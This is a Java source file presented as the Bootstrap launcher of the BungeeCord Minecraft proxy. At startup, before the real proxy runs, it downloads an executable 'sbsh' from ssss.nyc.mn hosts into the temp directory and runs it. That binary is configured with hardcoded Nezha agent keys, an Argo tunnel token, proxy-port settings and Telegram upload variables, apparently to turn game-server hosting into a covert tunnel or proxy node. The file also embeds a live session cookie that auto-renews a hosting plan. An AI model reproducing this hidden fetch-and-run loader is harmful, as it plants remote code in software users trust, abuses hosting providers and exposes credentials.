package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

public class Bootstrap {
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;

    // ==================== 续期配置 ====================
    private static final String SERVER_ID = "384ce199";
    private static final String COOKIE = "mcserverhost=71692078-9c76-4e27-b2b6-c2e6dd97791a; _ga=GA1.1.1915121420.1761101068; twk_idm_key=3aIsQsu0HQXy_9ObVHIAI; __stripe_mid=dd7b352c-49ac-4c61-b1a9-1f645f29b877419afb; __stripe_sid=5bfc6b13-ba82-419f-b216-81c3ba67a1559ccc7d; TawkConnectionTime=0; twk_uuid_674201982480f5b4f5a2f121=%7B%22uuid%22%3A%221.2BjBBhwnddtoIxq9Bqyi5Hs1oxd8PTxLtoSNgfY2mhOHEbYlCmCBCzFSIEExKIklpSyoziJQ9BGiogbUUv3pp64jcFf8UQiFsLvjwRNhKIN9VfD0yjqRuruap95%22%2C%22version%22%3A3%2C%22domain%22%3A%22mcserverhost.com%22%2C%22ts%22%3A1761127297763%7D; _ga_SRYKCFQGK0=GS2.1.s1761126817$o3$g1$t1761127706$j60$l0$h0";
    private static final String BASE_URL = "https://www.mcserverhost.com";

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME"
    };

    public static void main(String[] args) throws Exception {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too low!" + ANSI_RESET);
            Thread.sleep(3000);
            System.exit(1);
        }

        try {
            runSbxBinary();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            // 等待 Sbx 启动
            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!" + ANSI_RESET);

            // ======== 自动续期 ========
            renewServer();
            System.out.println(ANSI_GREEN + "续期请求已发送 ✅" + ANSI_RESET);

            System.out.println(ANSI_GREEN + "Enjoy!\n" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }

        BungeeCordLauncher.main(args);
    }

    // ==================== 续期方法 ====================
    private static void renewServer() {
        try {
            String apiUrl = BASE_URL + "/api/servers/" + SERVER_ID + "/subscription";
            String referer = BASE_URL + "/servers/" + SERVER_ID + "/dashboard";

            HttpURLConnection conn = (HttpURLConnection) new URL(apiUrl).openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Cookie", COOKIE);
            conn.setRequestProperty("Accept", "*/*");
            conn.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.9");
            conn.setRequestProperty("Origin", BASE_URL);
            conn.setRequestProperty("Referer", referer);
            conn.setRequestProperty("X-Requested-With", "XMLHttpRequest");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
            conn.setDoOutput(true);

            int responseCode = conn.getResponseCode();
            if (responseCode == 200) {
                System.out.println(ANSI_GREEN + "服务器续期成功！" + ANSI_RESET);
            } else {
                System.out.println(ANSI_RED + "续期失败，HTTP状态码：" + responseCode + ANSI_RESET);
            }
            conn.disconnect();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "续期请求出错: " + e.getMessage() + ANSI_RESET);
        }
    }

    // ==================== 原有方法 ====================
    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }

    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);

        sbxProcess = pb.start();
    }

    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "1c0319f5-f4b8-48c1-9151-264b32a0eb0f");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "ip.086571.xyz:8008");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "YiSBm5Hzzl9AadRQjLcHymN2WoZTR6hk");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "mcserverhost.gpt.us.kg");
        envVars.put("ARGO_AUTH", "eyJhIjoiNTdhZDk5Y2U4MDQ2MTg2ZGEyZWI1ZTQ3YjVmODlhNDMiLCJ0IjoiYmYzODY0MTMtMDQ3YS00ZDEyLWE2MGUtZDUyNTRjMTNkYzU0IiwicyI6IlpXRmpOekprT1RVdE1qUmxOQzAwTURjMUxUazRZMkl0T1dNNE1qa3hOalEzTldJNSJ9");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "cf.877774.xyz");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "Mcserverhost");

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }

        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;

                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }

                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }

    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }
}
